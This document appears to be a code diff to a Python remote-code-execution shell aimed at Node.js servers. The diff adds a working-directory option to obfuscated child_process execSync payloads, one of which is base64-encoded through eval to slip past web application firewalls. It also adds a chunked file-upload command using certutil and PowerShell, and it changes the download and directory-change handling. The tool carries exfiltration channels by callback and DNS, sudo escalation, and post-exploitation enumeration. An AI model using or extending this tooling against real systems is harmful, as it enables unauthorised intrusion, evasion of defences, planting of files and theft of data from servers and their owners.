@@ -114,14 +114,19 @@ class PayloadStrategy:
     def js_rce(cmd,exfil='redirect',obf_level=0,**kw):
         """Build the JS code that goes into _prefix."""
         ce=cmd.replace("\\","\\\\").replace("'","\\'").replace('"','\\"')
+        cwd=kw.pop('cwd',None)
+        cwd_opt=''
+        if cwd:
+            cwd_esc=cwd.replace("\\","\\\\").replace("'","\\'")
+            cwd_opt=f",cwd:'{cwd_esc}'"
         # Build require chain based on obfuscation
         if obf_level==0:
-            rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000}})"
+            rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}})"
         elif obf_level<=2:
-            rce=f"process['main'+'Module']['req'+'uire']('child_'+'process')['exec'+'Sync']('{ce}',{{timeout:8000}})"
+            rce=f"process['main'+'Module']['req'+'uire']('child_'+'process')['exec'+'Sync']('{ce}',{{timeout:8000{cwd_opt}}})"
         else:
             # eval(Buffer.from(b64)) — hides ALL JS from WAF
-            inner=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000}})"
+            inner=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}})"
             inner_full=PayloadStrategy._exfil_wrap(inner,exfil,**kw)
             b=base64.b64encode(inner_full.encode()).decode()
             return f"eval(Buffer.from('{b}','base64').toString())//"
@@ -131,12 +136,17 @@ class PayloadStrategy:
     def js_rce_truncated(cmd,max_bytes=4000,exfil='redirect',obf_level=0,**kw):
         """Like js_rce but truncates output server-side for large commands."""
         ce=cmd.replace("\\","\\\\").replace("'","\\'").replace('"','\\"')
+        cwd=kw.pop('cwd',None)
+        cwd_opt=''
+        if cwd:
+            cwd_esc=cwd.replace("\\","\\\\").replace("'","\\'")
+            cwd_opt=f",cwd:'{cwd_esc}'"
         if obf_level==0:
-            rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000}}).toString().substring(0,{max_bytes})"
+            rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}}).toString().substring(0,{max_bytes})"
         elif obf_level<=2:
-            rce=f"process['main'+'Module']['req'+'uire']('child_'+'process')['exec'+'Sync']('{ce}',{{timeout:8000}}).toString().substring(0,{max_bytes})"
+            rce=f"process['main'+'Module']['req'+'uire']('child_'+'process')['exec'+'Sync']('{ce}',{{timeout:8000{cwd_opt}}}).toString().substring(0,{max_bytes})"
         else:
-            inner=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000}}).toString().substring(0,{max_bytes})"
+            inner=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}}).toString().substring(0,{max_bytes})"
             inner_full=PayloadStrategy._exfil_wrap_str(inner,exfil,**kw)
             b=base64.b64encode(inner_full.encode()).decode()
             return f"eval(Buffer.from('{b}','base64').toString())//"
@@ -394,12 +404,7 @@ class AdvancedShell:
         ol=obf if obf is not None else self.obf_level
         ch=exfil or self.exfil_ch
         final=cmd
-        # Keep same proven wrapping for ALL platforms — it works on Windows cmd.exe too
-        if self.current_dir:
-            if self.target_os=='windows':
-                final=f'cd /d {self.current_dir} & {cmd}'
-            else:
-                final=f"cd {self.current_dir} && {cmd}"
+        # Wrapping: bash-style works on both Linux and Windows cmd.exe
         if self.root_mode and self.target_os!='windows':
             b=base64.b64encode(final.encode()).decode()
             final=f'echo {b}|base64 -d|sudo -i 2>&1||true'
@@ -408,6 +413,8 @@ class AdvancedShell:
         kw={}
         if ch=='callback' and self.callback_url:kw['callback_url']=self.callback_url
         if ch=='dns' and self.dns_domain:kw['dns_domain']=self.dns_domain
+        # Pass cwd via execSync option — avoids backslash escaping issues
+        if self.current_dir:kw['cwd']=self.current_dir
         # Use truncated version by default to avoid header overflow
         if self.truncate:
             js=PayloadStrategy.js_rce_truncated(final,4000,ch,ol,**kw)
@@ -508,8 +515,7 @@ class AdvancedShell:
                 clean='\n'.join(lines).strip()
                 if clean:
                     print(f"  {C}--- {section} ---{W}")
-                    for line in clean.split('\n')[:50]:print(f"  {line}")
-                    if len(clean.split('\n'))>50:print(f"  {DIM}... ({len(clean.split(chr(10)))} lines total){W}")
+                    for line in clean.split('\n'):print(f"  {line}")
             else:
                 print(f"  {C}{section}:{W} {R}failed{W}")
 
@@ -689,8 +695,9 @@ class AdvancedShell:
   {G}.obf{W} N            JS obfuscation 0-4     {G}.jsonesc{W} N       JSON escape 0-2
   {G}.bypass{W} [preset]  WAF bypass preset      {G}.debug{W}            Toggle debug
   {G}.timeout{W} N        Set timeout            {G}.status{W}           Show config
-  {G}.host{W} domain      Set Host header        {G}.download{W} path   Download file
-  {G}.root{W}             Toggle sudo            {G}.save{W}             Save output
+  {G}.host{W} domain      Set Host header        {G}.upload{W} l r       Upload file
+  {G}.download{W} path    Download file          {G}.root{W}             Toggle sudo
+  {G}.save{W}             Save output
 
 {BOLD}Post-Exploitation:{W}
   {G}.info{W}             Quick system enum      {G}.fullinfo{W}         Full enum (all below)
@@ -835,33 +842,95 @@ class AdvancedShell:
                     elif cmd=='.software':self.post_software()
                     elif cmd.startswith('.cat '):
                         p=cmd.split(' ',1);self.post_cat(p[1]) if len(p)>1 else print('Usage: .cat <filepath>')
+                    elif cmd.startswith('.upload') or cmd.startswith('.ul'):
+                        p=cmd.split()
+                        if len(p)<3:print(f"Usage: .upload <local_path> <remote_path>");continue
+                        lp,rp=p[1],p[2]
+                        if not os.path.isfile(lp):print(f"{R}Local file not found: {lp}{W}");continue
+                        data=open(lp,'rb').read()
+                        b64=base64.b64encode(data).decode()
+                        fsize=len(data);print(f"{Y}[*] Uploading {lp} → {rp} ({fsize}B, {len(b64)}B base64){W}")
+                        CHUNK=1500  # base64 chars per chunk
+                        chunks=[b64[i:i+CHUNK] for i in range(0,len(b64),CHUNK)]
+                        if self.target_os=='windows':
+                            # Use PowerShell to decode base64
+                            if len(chunks)==1:
+                                o=self.execute(f'powershell -c "[IO.File]::WriteAllBytes(\'{rp}\',[Convert]::FromBase64String(\'{b64}\'))"')
+                            else:
+                                # Write base64 chunks to temp file then decode
+                                tmp=rp+'.b64'
+                                for i,chunk in enumerate(chunks):
+                                    op='>' if i==0 else '>>'
+                                    o=self.execute(f'echo {chunk}{op}"{tmp}"')
+                                    if o and '[-]' in o:print(f"{R}Chunk {i+1}/{len(chunks)} failed{W}");break
+                                    sys.stdout.write(f"\r  Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
+                                print()
+                                o=self.execute(f'certutil -decode "{tmp}" "{rp}" & del "{tmp}"')
+                        else:
+                            if len(chunks)==1:
+                                o=self.execute(f"echo '{b64}'|base64 -d > '{rp}'")
+                            else:
+                                tmp=rp+'.b64'
+                                for i,chunk in enumerate(chunks):
+                                    op='>' if i==0 else '>>'
+                                    o=self.execute(f"echo -n '{chunk}'{op}'{tmp}'")
+                                    if o and '[-]' in o:print(f"{R}Chunk {i+1}/{len(chunks)} failed{W}");break
+                                    sys.stdout.write(f"\r  Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
+                                print()
+                                o=self.execute(f"base64 -d '{tmp}' > '{rp}' && rm '{tmp}'")
+                        if o and '[-]' not in o:print(f"{G}[+] Upload complete: {rp}{W}")
+                        else:print(f"{Y}[!] Upload may have failed. Verify with: .cat {rp}{W}")
                     elif cmd.startswith('.download') or cmd.startswith('.dl'):
                         p=cmd.split()
                         if len(p)<2:print("Usage: .download <remote> [local]");continue
                         rp=p[1];lp=p[2] if len(p)>2 else f"dl_{os.path.basename(rp)}"
                         os.makedirs(os.path.dirname(os.path.abspath(lp)) or '.',exist_ok=True)
+                        print(f"{Y}[*] Downloading {rp}...{W}")
                         if self.target_os=='windows':
-                            o=self.execute(f'certutil -encodehex "{rp}" CON 0x40000001 2>nul')
+                            o=self.execute(f'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'{rp}\'))"')
                         else:
-                            o=self.execute(f"base64 -w0 {rp}")
+                            o=self.execute(f"base64 -w0 '{rp}'")
                         if o and '[-]' not in o and '[!' not in o:
                             try:
                                 clean=o.strip().replace('\r','').replace('\n','').replace(' ','')
-                                d=base64.b64decode(clean);open(lp,'wb').write(d);print(f"{G}Saved: {lp} ({len(d)}B){W}")
+                                d=base64.b64decode(clean);open(lp,'wb').write(d);print(f"{G}[+] Saved: {lp} ({len(d)}B){W}")
                             except Exception as e:print(f"{R}Decode error: {e}{W}")
                         else:print(f"{R}Failed to read file{W}")
                     elif cmd.startswith('cd '):
-                        path=cmd.split(' ',1)[1]
+                        path=cmd.split(' ',1)[1].strip()
+                        if not path:continue
+                        # Resolve path: if relative, join with current_dir
                         if self.target_os=='windows':
-                            o=self.execute(f'cd /d "{path}" && cd')
+                            if path=='..' and self.current_dir:
+                                # Go up one level
+                                parts=self.current_dir.rstrip('\\').rsplit('\\',1)
+                                new_dir=parts[0] if len(parts)>1 else self.current_dir
+                            elif path=='.':
+                                new_dir=self.current_dir or ''
+                            elif ':\\' in path or path.startswith('\\\\'):
+                                new_dir=path  # absolute path
+                            elif self.current_dir:
+                                new_dir=self.current_dir.rstrip('\\')+'\\'+path
+                            else:
+                                new_dir=path
+                            # Verify directory exists
+                            o=self.execute(f'cd /d "{new_dir}" && cd')
                             if o and '[-]' not in o:
                                 lines=[x for x in o.strip().split('\n') if x.strip() and 'cannot find' not in x.lower()]
-                                if lines:self.current_dir=lines[-1].strip()
+                                if lines:
+                                    self.current_dir=lines[-1].strip()
+                                    print(f"{G}CWD: {self.current_dir}{W}")
+                                else:print(f"{R}Directory not found: {new_dir}{W}")
+                            else:print(f"{R}Cannot cd to: {new_dir}{W}")
                         else:
-                            o=self.execute(f"cd {path} && pwd")
-                            if o and o.strip().startswith('/') and '[-]' not in o:self.current_dir=o.strip().split('\n')[0]
-                        if o and '[-]' not in o:print(f"{G}CWD: {self.current_dir}{W}")
-                        elif o:print(o)
+                            o=self.execute(f"cd '{path}' && pwd")
+                            if o and '[-]' not in o:
+                                lines=[x.strip() for x in o.strip().split('\n') if x.strip().startswith('/')]
+                                if lines:
+                                    self.current_dir=lines[-1]
+                                    print(f"{G}CWD: {self.current_dir}{W}")
+                                else:print(f"{R}cd failed{W}")
+                            elif o:print(o)
                     else:
                         out=self.execute(cmd);self.last_output=out or ""
                         if out:print(out)
